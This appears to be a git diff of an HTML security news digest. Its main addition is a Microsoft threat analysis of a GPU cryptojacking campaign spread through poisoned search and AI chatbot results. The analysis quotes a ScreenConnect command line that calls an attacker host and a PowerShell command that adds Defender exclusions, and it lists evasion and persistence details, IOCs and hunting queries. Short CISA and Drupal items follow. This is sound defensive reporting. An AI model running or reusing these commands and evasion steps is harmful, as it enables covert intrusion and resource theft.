@@ -59,22 +59,397 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-05-26</h1>
+        <h1>Security Briefing // 2026-05-27</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">CISA orders feds to patch actively exploited Drupal vulnerability</button></li><li><button onclick="show('art-1')">Exploitation of KnowledgeDeliver via ViewState Deserialization Vulnerability</button></li><li><button onclick="show('art-2')">Netherlands Seizes 800 Servers, Arrests 2 for Aiding Cyberattacks</button></li><li><button onclick="show('art-3')">Ghost CMS CVE-2026-26980 Exploited to Hijack 700+ Sites for ClickFix Attacks</button></li><li><button onclick="show('art-4')">CISA Adds Exploited Langflow and Trend Micro Apex One Vulnerabilities to KEV</button></li><li><button onclick="show('art-5')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-6')">Shai-Hulud Is Back, and This Time It Ate the Whole Ecosystem</button></li><li><button onclick="show('art-7')">Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft</button></li><li><button onclick="show('art-8')">Patch Tuesday, May 2026 Edition</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
+            <ul><li><button onclick="show('art-0')">From poisoned search results to GPU mining: A cryptojacking campaign abusing ScreenConnect and Microsoft .NET utilities</button></li><li><button onclick="show('art-1')">CISA Adds One Known Exploited Vulnerability to Catalog</button></li><li><button onclick="show('art-2')">CISA orders feds to patch actively exploited Drupal vulnerability</button></li><li><button onclick="show('art-3')">KnowledgeDeliver LMS Flaw Exploited to Deploy Godzilla and Cobalt Strike</button></li><li><button onclick="show('art-4')">PCI DSS, Telephone Payments, and the Problems With VoIP</button></li><li><button onclick="show('art-5')">Exploitation of KnowledgeDeliver via ViewState Deserialization Vulnerability</button></li><li><button onclick="show('art-6')">Netherlands Seizes 800 Servers, Arrests 2 for Aiding Cyberattacks</button></li><li><button onclick="show('art-7')">CISA Adds Exploited Langflow and Trend Micro Apex One Vulnerabilities to KEV</button></li><li><button onclick="show('art-8')">Patch Tuesday, May 2026 Edition</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 class="article-title">CISA orders feds to patch actively exploited Drupal vulnerability</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-patch-actively-exploited-drupal-vulnerability/" target="_blank">Original Link</a></p>
-            <div class="content-text">CISA has given U.S. government agencies until Wednesday evening to secure their servers against an SQL injection vulnerability in the Drupal content management system (CMS) that it flagged as actively exploited. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
+            <h2 class="article-title">From poisoned search results to GPU mining: A cryptojacking campaign abusing ScreenConnect and Microsoft .NET utilities</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/" target="_blank">Original Link</a></p>
+            <div class="content-text">Microsoft Defender Experts identified an active cryptojacking campaign in which malicious download sites are surfaced not only through traditional search engine poisoning, but also through AI chatbot interactions. This emerging delivery technique extends social engineering beyond conventional search results and increases the visibility of malicious software recommendations.
+The campaign impersonates trusted system utilities including CrystalDiskInfo, HWMonitor, Display Driver Uninstaller, FurMark, K-Lite Codec Pack, and PDFgear to target users likely to own high-performance GPUs. Rather than maximizing infection volume, the threat actor appears focused on compromising systems with higher mining value.
+Beyond cryptocurrency mining, the campaign establishes persistent remote access through abused ScreenConnect deployments that could later support data theft, lateral movement, or ransomware activity. This combination of AI-assisted delivery, software impersonation, and persistent access highlights how threat actors are adapting social engineering and monetization strategies to modern user behavior.
+Microsoft Defender detected and blocked activity associated with this campaign. Organizations should enable cloud-delivered protection, run EDR in block mode, and enable attack surface reduction rules to reduce risk.
+Attack chain overview
+Cryptocurrency mining campaigns have long favored volume over precision, compromising as many hosts as possible to extract marginal value from each. The campaign described in this blog takes a more deliberate approach: its operators have built a targeting and monetization strategy engineered from the ground up to maximize GPU mining yield per compromised device.
+Initial access
+The campaign begins when users search for common system utility and hardware-monitoring software on a search engine. The users are then presented with manipulated results that direct them to attacker-controlled lookalike sites. The operator runs a coordinated SEO poisoning operation that simultaneously masquerades as a broad portfolio of trusted utility brands, where each one serves the same downstream payload chain.
+The campaign abuses multiple trusted brands, including: CrystalDiskInfo, HWMonitor, Display Driver Uninstaller, FurMark, K-Lite Codec Pack, and PDFgear. The selection of these brands is deliberate. Each application is favored by PC enthusiasts and hardware-focused users, precisely the audience most likely to own a high-performance discrete GPU, the hardware that makes GPU cryptocurrency mining economically viable.
+In April 2026, we observed reports indicating that users may have been directed to malicious domains through interactions with large language model (LLM)–based tools. In these cases, users querying AI chatbots for software download recommendations were presented with links to attacker‑controlled domains within generated responses. Analysis of VirusTotal scan associated with these domains further identified traffic metadata referencing chatbot interactions as a potential referral context.
+While this behavior is based on observed patterns and correlated data sources, it’s consistent with emerging techniques in AI search result poisoning, representing an extension of traditional SEO poisoning beyond conventional search engines.
+Each fake site presents a download button that claims it has the legitimate utility. The download instead retrieves a ZIP archive hosted on a campaign‑specific subdomain of gleeze.com. The gleeze.com parent domain is hosted by infrastructure associated with Dynu (dynu.com), a dynamic DNS provider frequently leveraged by threat actors.
+Since March 2026, we’ve identified more than 150 malicious domains that we assess serve these malicious tools, masqueraded as system utilities linked to this campaign.
+DLL sideloading and silent installation of ScreenConnect software
+The downloaded ZIP archive contains the legitimate executable for the spoofed utility alongside a malicious DLL named autorun.dll. When the user launches the executable, the legitimate program loads autorun.dll from the same folder via DLL sideloading, a technique that requires no exploitation and generates no user-visible anomaly. Analysis revealed nine distinct autorun.dll variants across the campaign.
+The malicious DLL uses msiexec.exe to silently install a second malicious DLL named vcredist_x64.dll, named to masquerade as the Visual C++ Redistributable. This file is itself a packaged installer for ScreenConnect software.
+ScreenConnect software (also known as ConnectWise Control) is a legitimate commercial remote management tool widely used by IT administrators. The tool itself is not at fault; rather, the threat actor abuses its legitimate capabilities to establish persistent remote access consistent with a broader pattern of remote monitoring and management (RMM) tool abuse observed across the threat landscape
+Once installed, the ScreenConnect client constantly attempts to communicate with the attacker-controlled server at 193.42.11[.]108 via the following service invocation:
+1 2 | "ScreenConnect.ClientService.exe" "?e=Access&y=Guest&h=directdownload.icu&p=8041&s=b31c5795-9b66-4d20-ac8d-aad60d05852a&k=...&c=Crystaldeskinfo%20New%20New%20New&c=&c=&c=&c=&c=&c=&c=" |
+The h parameter (directdownload[.]icu) is the host the client connects to.
+The repeated c= parameters are ScreenConnect’s custom property fields, which in some cases closely matched the software used to drop ScreenConnect. However, across other instances we were unable to verify if this is an identifier linked to the software used via SEO poisoning.
+Execution
+SimpleRunPE dropper and process hollowing
+Once the ScreenConnect session is established, the attacker drops a binary named SimpleRunPE.exe directly via ScreenConnect’s file-transfer feature.
+Project lineage
+Static analysis of this binary surfaced an embedded Program Database (PDB) path inside the binary’s debug directory:
+1 | G:\My Drive\works\test projects\Simple-RunPE-Process-Hollowing-RUNPE\SimpleRunPE\obj\Release\SimpleRunPE.pdb |
+The folder structure in the path matches a public proof-of-concept repository on GitHub (Watermwo/Simple-RunPE-Process-Hollowing), with a -RUNPE suffix. With this information, Microsoft assesses with moderate confidence that the dropped binary’s process hollowing might be a fork of this public codebase. Using this PDB path as a pivot, we identified multiple binaries sharing similar debug paths, all reported to the Microsoft Defender team and addressed.
+Install path and the alternative PowerShell delivery
+Once executed, SimpleRunPE.exe writes a copy of itself into a hidden install folder as RuntimeHost.exe. The install folder name uses the campaign identifier D3F4E2A1, which recurs throughout the malware as a mutex name (Global\D3F4E2A1_Svc) and in Defender exclusion entries.
+The malware sets the Hidden and System file attributes on both the install folder and the RuntimeHost.exe file, hiding them from default Explorer views. The malware first attempts to install into a preferred location resolved at runtime and falls back to %LocalAppData%\Microsoft\Windows\Caches\D3F4E2A1\ if the preferred location is not writable.
+In a subset of compromises, rather than dropping SimpleRunPE.exe directly via ScreenConnect file transfer, a malicious PowerShell script that fetched the binary from a remote drive, stored it locally as vlc.exe, and created a one-time scheduled task to execute and then delete itself, reducing forensic traceability.
+Persistence
+Once SimpleRunPE.exe has copied itself to the install path as RuntimeHost.exe, it establishes six persistence mechanisms across multiple Windows autostart locations. The persistence mechanisms span three scheduled tasks, two registry Run keys, and one Startup folder shortcut.
+| Tactic | Trigger | Identifier |
+| Scheduled task | On user logon (highest privileges) | Task name: Windows System Health |
+| Scheduled task | On system boot, 1-hour delay (highest privileges) | Task name: Windows System Health Monitor |
+| Scheduled task | Every 5 minutes (highest privileges) | Task name: Windows System Health Check |
+| Registry Run key (machine) | On any user logon | HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WinSysCache |
+| Registry Run key (user) | On current user logon | HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinSysCache |
+| Startup folder shortcut | On current user logon | %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeHost.lnk |
+Each time the persistence mechanism executes, it relaunches RuntimeHost.exe, which functions as a recovery mechanism for the follow up process hollowing behaviour. Each time the persistence mechanism launches RunTimeHost, it validates whether the following behavior is complete. If the behavior isn’t complete, the rumtimehost.exe attempts to hollow as well.
+Defense evasion
+Process hollowing into Microsoft-signed .NET binaries
+The malware simplerunpe.exe proceeds to attempt process hollowing into a legitimate Microsoft-signed binary. The malware carries a hardcoded list of seven candidate target processes, all of them legitimate Windows utilities that ship with the .NET Framework. These targets are tried in order, and the first one whose binary is present on the host’s disk is selected:
+- InstallUtil.exe
+- RegAsm.exe
+- RegSvcs.exe
+- MSBuild.exe
+- AppLaunch.exe
+- AddInProcess.exe
+- aspnet_compiler.exe
+The dropper launches the chosen target binary in a suspended state and uses API calls such as WriteProcessMemory, SetThreadContext, ResumeThread to hollow the process. This causes the malicious mining code to run under the identity of a trusted Microsoft-signed binary and execute its own code.
+Defender exclusions
+The malware simplerunpe.exe invokes PowerShell to call the Add-MpPreference cmdlet, registering both path-based and process-based exclusions.
+1 | powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath @(...) -ErrorAction SilentlyContinue" |
+Process-name exclusions cover 13 binaries:
+- The seven .NET hollowing targets (InstallUtil.exe, RegAsm.exe, RegSvcs.exe, MSBuild.exe, AppLaunch.exe, AddInProcess.exe, aspnet_compiler.exe)
+- SecurityHealthHost.exe, RuntimeHost.exe, lolMiner.exe, SRBMiner-MULTI.exe, miner.exe, and gminer.exe
+Anti-analysis check
+The malware performs anti-analysis checks, exiting silently if any indicator suggests the binary is running in an analysis environment.
+The malware checks for virtual machine detection: (registry keys for VMware Tools and VirtualBox Guest Additions, the SCSI Identifier value checked against VBOX/VMWARE/QEMU substrings, MAC address prefix matching against known virtualization vendor ranges, and WMI queries against Win32_ComputerSystem and Win32_BIOS.
+The malware also checks against a hardcoded list of forty analyst-tool process names spanning debuggers, disassemblers, decompilers, PE inspection tools, and network analysis utilities, including dnSpy, x64dbg, IDA, Ghidra, ProcMon, Wireshark, Fiddler.
+If any of the binaries are detected, the process terminates its execution.
+Custom crypto mining loader
+Once process hollowing is complete and the malware is running inside a Microsoft-signed Windows utility, the mining-client portion of the binary takes over. The first action is to acquire a system-wide mutex named Global\D3F4E2A1_Svc. The mutex name uses the same campaign identifier (D3F4E2A1) as the install-path directory and the Defender exclusion paths.
+RuntimeHost.exe probes this mutex to confirm that hollowing has already succeeded and the hollowed process is still alive on the host.
+Host-based reconnaissance
+The hollowed binary establishes a connection to the attacker’s server (described in the next section) and sends a registration frame containing comprehensive host reconnaissance to the attacker controlled C2/panel.
+| Category | What’s collected |
+| Fingerprinting | CPU model and core count; GPU model and vendor with integrated vs. discrete classification; total physical RAM; device type. |
+| Live resource state | Current CPU usage; current GPU usage (separately for total and dedicated GPU); GPU temperature; system uptime. |
+| Operating system | Windows version and architecture, full Windows product name, whether the malware is running with administrative privileges. |
+| Network identity | Local IP address; country code derived from an outbound geolocation lookup. |
+| Security posture | Installed antivirus product enumerated via Windows Security Center. |
+| User activity | Idle seconds (time since last keyboard or mouse input). |
+| GPU activity detection | Detection of gaming, streaming, or other GPU-heavy user activity based on sustained GPU usage. |
+| Mining state | Whether the miner process is currently running; current latency to the mining pool. |
+Command and control encrypted address and certificate pinning
+The address of the attacker’s server is held inside an encrypted blob using AES-128-CBC encryption. In addition to obfuscating the address, we observed a hard-coded Transport Layer Security (TLS) certificate.
+Decrypting the embedded blob yields the C2 URL wss[:]//minemine.gleeze[.]com:8443/ws.
+The malware also hardcodes the SHA-256 fingerprint of the TLS certificate expected at this endpoint, used to pin the connection during the WebSocket handshake:
+1 | EB:C3:5D:4A:08:D9:3A:88:0E:90:AE:AD:2D:3F:7F:B4:3F:DC:08:EA:77:DB:9D:D5:2F:80:78:1E:6B:FD:88:67 |
+Mining orchestration
+The malware (hollowed Windows binary) doesn’t embed a miner program. Instead, when it’s time to begin mining, the malware downloads the appropriate miner archive at runtime and runs it. Three miner programs are supported: gminer, lolMiner, and SRBMiner-MULTI, all of which are GPU-focused tools.
+Auto-repair persistence and activity tracking
+The hollowed binary also runs a continuous background routine that wakes every five seconds and checks whether mining should currently be paused (based on the GPU-activity gate), and whether all six persistence mechanisms are still in place.
+When the verification cycle runs, the malware
+- Checks each of the three scheduled tasks by invoking schtasks.exe /query /tn “<task name>” and recreates any task whose query returns a non-zero exit code.
+- Checks each of the two registry Run keys via direct registry reads and rewrites missing or modified entries.
+- Checks the Startup folder shortcut by file existence and recreates it if missing.
+- Re-runs the Defender exclusion registration on every cycle, ensuring any exclusions that were removed are restored.
+Apart from verifying the persistence, the malware also tracks the process activity on the device. As soon as the loader detects the following processes as running, it terminates the miner process.
+The malware also monitors GPU usage and terminates its activity. If the GPU usage is high or the device isn’t idle, the mining processes are terminated.
+Certificate pivoting
+As mentioned previously, using this hard-coded certificate, we identified 3 IPs using this specific TLS certificate.
+Using OSINT, this TLS certificate was observed to be presented by 3 IP addresses. Microsoft assesses that these IPs are part of the C2 infrastructure.
+• 93.115[.]10.35
+• 198.23[.]185.238
+• 2.59.132[.]106
+Using these IPs as pivots, we observed that there were additional linked campaigns using a similar DynamicDNS domain giize[.]com. Some of the sources of the malicious file downloads in these campaigns originated from:
+- Direct-download[.]giize[.]com
+- Free-download[.]giize[.]com
+These domains are also linked to a series of malicious domains performing similar SEO poisoning-based campaigns, leading to same infection chain described in this blog.
+Mitigation and protection guidance
+Microsoft recommends the following mitigations to reduce the impact of this threat. Check the recommendations card for the deployment status of monitored mitigations.
+Turn on [cloud-delivered protection](https://learn.microsoft.com/microsoft-365/security/defender-endpoint/configure-block-at-first-sight-microsoft-defender-antivirus) in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants.
+Microsoft Defender XDR customers can turn on [attack surface reduction rules](https://learn.microsoft.com/defender-endpoint/attack-surface-reduction) to prevent several of the infection vectors of this threat. These rules, which can be configured by any user, offer significant hardening against targeted attacks. In observed attacks, Microsoft customers who had the following rules turned on could mitigate the attack in the initial stages and prevent hands-on-keyboard activity:
+Enable [network protection](https://learn.microsoft.com/defender-endpoint/enable-network-protection) in Microsoft Defender for Endpoint.
+Turn on [web protection](https://learn.microsoft.com/defender-endpoint/web-protection-overview) in Microsoft Defender for Endpoint.
+Encourage users to use Microsoft Edge and other web browsers that support [SmartScreen](https://learn.microsoft.com/windows/security/operating-system-security/virus-and-threat-protection/microsoft-defender-smartscreen/), which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware.
+Remind employees that enterprise or workplace credentials should not be stored in browsers or password vaults secured with personal credentials. Organizations can turn off password syncing in browser on managed devices using [Group Policy](https://learn.microsoft.com/deployedge/microsoft-edge-enterprise-sync#sync-group-policies).
+Turn on the following [attack surface reduction rule](https://learn.microsoft.com/defender-endpoint/attack-surface-reduction) to block or audit activity associated with this threat:
+Block executable files from running unless they meet a prevalence, age, or trusted list criterion(GUID: 01443614-cd74-433a-b99e-2ecdc07bfc25)
+Microsoft Defender detections
+Microsoft Defender customers can refer to the list of applicable detections below. Microsoft Defender coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.
+Customers with provisioned access can also use [Microsoft Security Copilot in Microsoft Defender](https://learn.microsoft.com/en-us/defender-xdr/security-copilot-in-microsoft-365-defender) to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.
+| Tactic | Observed activity | Microsoft Defender coverage |
+| Execution | Unusual ScreenConnect service creation activity | Suspicious service launched (endpoint detection and response – EDR) |
+| Malicious DLL sideloading linked to autorun.dll | An executable file loaded an unexpected DLL file (EDR) | |
+| ScreenConnect Installation activity | Suspicious behaviour by msiexec.exe (EDR) | |
+| Defender detection of crypto mining framework binary | Trojan:MSIL/CoinMiner!MS(AV) | |
+| MDAV detection of suspicious DLL | HackTool:Win64/Malgent!MSR(AV) | |
+| Persistence | Scheduled task creation activity associated with malicious binary | Suspicious Task Scheduler activity |
+| Malicious ASEP linked with malicious binary execution | Anomaly detected in ASEP registry | |
+| Suspicious .LNK file in startup folder | An uncommon file was created and added to startup folder | |
+| Defense Evasion | Antivirus exclusion added by malicious binary | Suspicious Defender Antivirus exclusion Modification attempt in Microsoft Defender Antivirus exclusion listAn uncommon file was created and added to startup folder |
+| Process hollowing activity to malicious binary | A process was injected with potentially malicious code | |
+| Command and control | Attacker executing malicious commands via ScreenConnect | Suspicious command execution via ScreenConnect |
+Microsoft Security Copilot
+Security Copilot customers can use the standalone experience to [create their own prompts](https://learn.microsoft.com/copilot/security/prompting-security-copilot#create-your-own-prompts) or run the following [prebuilt promptbooks](https://learn.microsoft.com/copilot/security/using-promptbooks) to automate incident response or investigation tasks related to this threat:
+- Incident investigation
+- Microsoft User analysis
+- Threat actor profile
+- Threat Intelligence 360 report based on MDTI article
+- Vulnerability impact assessment
+Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender or Microsoft Sentinel.
+Advanced hunting
+Suspicious binary execution from unusual directory
+This query searches for suspicious RunTimeHost.exe from a specific directory. Executions from this directory are often linked to the relevant campaign.
+1 2 3 4 5 6 7 8 9 10 11 12 13 | // DeviceProcessEvents | where Timestamp > ago(30d) | where FileName =~ "RuntimeHost.exe" or InitiatingProcessFileName =~ "RuntimeHost.exe" | where (FolderPath has @"\Caches\D3F4E2A1") or (InitiatingProcessFolderPath has @"\Caches\D3F4E2A1") | project Timestamp, DeviceId, DeviceName, FileName, FolderPath, ProcessCommandLine, ParentProcess = InitiatingProcessFileName, ParentProcessPath = InitiatingProcessFolderPath, ParentProcessCmd = InitiatingProcessCommandLine, AccountName |
+Suspicious scheduled task creation activity
+This query looks for suspicious scheduled task creation activity with task names often associated with this cryptojacking campaign.
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 | //Run the below query to identify events linked to the suspicious scheduled task creation activity DeviceProcessEvents | where Timestamp > ago(30d) | where FileName =~ "schtasks.exe" | where ProcessCommandLine has "/create" | where ProcessCommandLine has_any ( "Windows System Health Monitor", "Windows System Health" ) | project Timestamp, DeviceId, DeviceName, AccountName, TaskCreationCmd = ProcessCommandLine, ParentProcess = InitiatingProcessFileName, ParentProcessPath = InitiatingProcessFolderPath, ParentProcessCmd = InitiatingProcessCommandLine |
+Suspicious MSIEXEC activity associated with a binary loading a suspicious DLL
+This query looks for a process loading a suspicious DLL named ‘autorun.dll’ followed by unusual MSIEXEC activity from the same binary.
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 | let SideloadingProcesses = DeviceImageLoadEvents | where Timestamp > ago(60d) | where FileName =~ "autorun.dll" | where InitiatingProcessFolderPath has_any ( @"\Downloads\", @"\AppData\Local\Temp\", @"\AppData\Roaming\", @"\ProgramData\", @"\Users\Public\",@"\Desktop\" ) |where FolderPath has @"\sources\" | project SideloadTime = Timestamp, DeviceId, DeviceName, LauncherProcessId = InitiatingProcessId, LauncherCreationTime = InitiatingProcessCreationTime, LauncherName = InitiatingProcessFileName, LauncherPath = InitiatingProcessFolderPath, SideloadedDllPath = FolderPath; let unique_devices=SideloadingProcesses|distinct DeviceId; let MsiSpawns = DeviceProcessEvents | where Timestamp > ago(60d) |where DeviceId in(unique_devices) | where FileName =~ "msiexec.exe" | where ProcessCommandLine has "/i" | where ProcessCommandLine has "/quiet" | project MsiSpawnTime = Timestamp, DeviceId, LauncherProcessId = InitiatingProcessId, LauncherCreationTime = InitiatingProcessCreationTime, MsiCmd = ProcessCommandLine, MsiProcessId = ProcessId ; SideloadingProcesses | join kind=inner MsiSpawns on DeviceId, LauncherProcessId, LauncherCreationTime | where MsiSpawnTime between (SideloadTime .. (SideloadTime + 30m)) | project SideloadTime, MsiSpawnTime, DeviceId, DeviceName, LauncherName, LauncherPath, LauncherProcessId, SideloadedDllPath, MsiCmd, MsiProcessId |
+Indicators of compromise (IOC)
+| Indicator | Type | Description |
+| direct-download[.]gleeze[.]com start-download[.]gleeze[.]com direct-downloads[.]giize.com free-download[.]giize.com | Domain | Hosts malicious ZIP files |
+| directdownload[.]icu | Domain | Host that ScreenConnect client connects to |
+| 16562974deec80e41ef57a71a6de8c03ceb393005fb1432f8d9d82c61294ef8c | SHA256 | autorun.dll loaded by legit EXE via DLL sideloading |
+| 1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5 | SHA256 | autorun.dll loaded by legit EXE via DLL sideloading |
+| 062bb28765fbaa11f8cc341fa16e2c7f942a122d929cb41f4a0f755b4429f246 | SHA256 | autorun.dll loaded by legit EXE via DLL sideloading |
+| c7425fbe6c3a4937934215c54027d4b67202d12ab490682fae03498870d66d06 | SHA256 | autorun.dll loaded by legit EXE via DLL sideloading |
+| a460d00ef93c8ce70d32e48e55781af66a53328fc2dde45519be196c265de074 | SHA256 | autorun.dll loaded by legit EXE via DLL sideloading |
+| db2d33c4e6e4a5c2263b56e8303c343305a94dde1fc2968304ba260acbbd9f9f | SHA256 | autorun.dll loaded by legit EXE via DLL sideloading |
+| cf3f8160eb5a5580e0c35054847e3ac4d01e9fe74fab8bc12bf6e8a40bf696b2 | SHA256 | autorun.dll loaded by legit EXE via DLL sideloading |
+| 69077fcf940fc5852fb32beed15636756ebc04ac971b7ed71d36251e7ea70a20 | SHA256 | autorun.dll loaded by legit EXE via DLL sideloading |
+| 2ee93ccbcd49ed94c65dcf52e7dcb8f0fa0a443ca24c0e0c7f79152efba657b7 | SHA256 | autorun.dll loaded by legit EXE via DLL sideloading |
+| 193.42.11[.]108 | IP address | ScreenConnect client communicates to this attacker controlled IP |
+| 9ff07c9fafa9c03fdf69e4abf6806aa7c938b5480e7e258f227db0719ecd6386 | SHA256 | SimpleRunPE.exe binary transferred by the attacker to the device during established ScreenConnect session |
+| 7035c2abeb617e828dfda1b119b8544fa9ae15a1d263d18bc5506acaf381f496 | SHA256 | SimpleRunPE.exe binary transferred by the attacker to the device during established ScreenConnect session |
+| e021662a652ba95c8778b991056696ab3c9b0f60d5e23b1e6cf73c3847db6610 | SHA256 | ScreenConnect file masquerading as a DLL |
+| wss[:]//minemine.gleeze[.]com:8443/ws | URL | C2 from hollowed binary |
+References
+[SEO Poisoning Attack Uses Microsoft Binary to Install RMM Tool](https://gbhackers.com/seo-poisoning-attack/#google_vignette)[Watermwo/Simple-RunPE-Process-Hollowing: The RunPE program is written in C# to execute a specific executable file within another files memory using the ProcessHollowing technique.](https://github.com/Watermwo/Simple-RunPE-Process-Hollowing)
+This research is provided by Microsoft Defender Security Research with contributions from Parasharan Raghavan and members of Microsoft Threat Intelligence.
+Learn more
+For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
+To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
+To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
+Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
+[Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)- Learn more about
+[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
+[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). - Learn more about
+[Protect your agents in real-time during runtime (Preview)](https://learn.microsoft.com/en-us/defender-cloud-apps/real-time-agent-protection-during-runtime) - Explore
+[how to build and customize agents with Copilot Studio Agent Builder](https://eurppc-word-edit.officeapps.live.com/we/%E2%80%A2%09https:/learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/copilot-studio-agent-builder)</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-1" class="article-body">
+            <h2 class="article-title">CISA Adds One Known Exploited Vulnerability to Catalog</h2>
+            <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/alerts/2026/05/26/cisa-adds-one-known-exploited-vulnerability-catalog" target="_blank">Original Link</a></p>
+            <div class="content-text">CISA Adds One Known Exploited Vulnerability to Catalog
+CISA has added one new vulnerability to its [Known Exploited Vulnerabilities (KEV) Catalog](/known-exploited-vulnerabilities-catalog), based on evidence of active exploitation.
+[CVE-2026-48172](https://www.cve.org/CVERecord?id=CVE-2026-48172)LiteSpeed cPanel Plugin Privilege Escalation Vulnerability
+This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise.
+[Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities](/binding-operational-directive-22-01) established the KEV Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the [BOD 22-01 Fact Sheet](/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf) for more information.
+Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of [KEV Catalog vulnerabilities](/known-exploited-vulnerabilities-catalog) as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the [specified criteria](/known-exploited-vulnerabilities).
+This product is provided subject to this [Notification](/notification) and this [Privacy & Use](/privacy-policy) policy.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
+            <h2 class="article-title">CISA orders feds to patch actively exploited Drupal vulnerability</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-patch-actively-exploited-drupal-vulnerability/" target="_blank">Original Link</a></p>
+            <div class="content-text">CISA has given U.S. government agencies until Wednesday evening to secure their servers against an SQL injection vulnerability in the Drupal content management system (CMS) that it flagged as actively exploited.
+Drupal is typically used by large organizations managing massive data structures and multi-site installations, including government entities, educational organizations, major research universities, and high-profile enterprise and media organizations.
+Google/Mandiant researcher Michael Maturi discovered this vulnerability (now tracked as [CVE-2026-9082](https://nvd.nist.gov/vuln/detail/CVE-2026-9082)) in Drupal's database abstraction API.
+The security flaw can be exploited without authentication, allowing attackers to trigger arbitrary SQL injection on PostgreSQL-powered sites via specially crafted requests. Successful exploitation can potentially lead to information disclosure, privilege escalation, and even remote code execution.
+The Drupal security team tagged the flaw as "highly critical" [before releasing patches](https://www.bleepingcomputer.com/news/security/drupal-critical-update-to-fix-bug-with-high-exploitation-risk/) and confirming that [exploitation attempts had been detected in the wild](https://www.bleepingcomputer.com/news/security/drupal-critical-sql-injection-flaw-now-targeted-in-attacks/).
+"Since CVE-2026-9082 was released, Imperva has observed over 15,000 attack attempts targeting almost 6,000 individual sites across 65 countries," cybersecurity firm Imperva [warned on May 21](https://www.imperva.com/blog/imperva-customers-protected-against-cve-2026-9082-in-drupal-core/). "Attacks are primarily targeting Gaming and Financial Services sites so far, at collectively almost 50% of all attacks."
+Internet security watchdog group Shadowserver now tracks [nearly 670 unpatched Drupal installations](https://dashboard.shadowserver.org/statistics/iot-devices/time-series/?date_range=other_range&d1=2026-05-22&d2=2026-05-25&vendor=drupal&type=cms&model=drupal&tag=cve-2026-9082%2B&dataset=count&limit=100&group_by=geo&stacking=stacked) exposed online, most of them from North America (272) and Europe (273).
+On Friday, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) [added](https://www.cisa.gov/news-events/alerts/2026/05/22/cisa-adds-one-known-exploited-vulnerability-catalog) the flaw to its [Known Exploited Vulnerabilities (KEV) Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?f%5B0%5D=vendor_project%3A807) and ordered Federal Civilian Executive Branch (FCEB) agencies to patch their systems by midnight on Wednesday, May 27, as mandated by [Binding Operational Directive (BOD) 22-01](https://www.cisa.gov/binding-operational-directive-22-01).
